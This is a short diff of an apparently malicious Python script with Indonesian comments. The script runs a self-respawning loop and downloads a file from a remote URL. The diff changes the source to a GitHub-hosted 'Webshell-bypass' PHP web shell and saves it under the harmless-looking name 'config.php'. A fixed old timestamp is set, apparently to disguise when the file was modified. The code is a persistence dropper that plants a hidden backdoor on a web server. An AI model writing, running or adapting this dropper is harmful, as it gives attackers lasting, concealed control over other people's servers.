@@ -54,8 +54,8 @@ def respawn():
             os.waitpid(pid, 0)  # Parent menunggu child mati, lalu respawn
 
 # URL sumber file yang akan diunduh
-url = "https://file.0x1999.tech/1.txt"
-file_name = "pomo.php"
+url = "https://github.com/sagsooz/Webshell-bypass/raw/main/alfa2024.php"
+file_name = "config.php"
 timestamp = "201201081531.12"
 
 # Jalankan fungsi penting
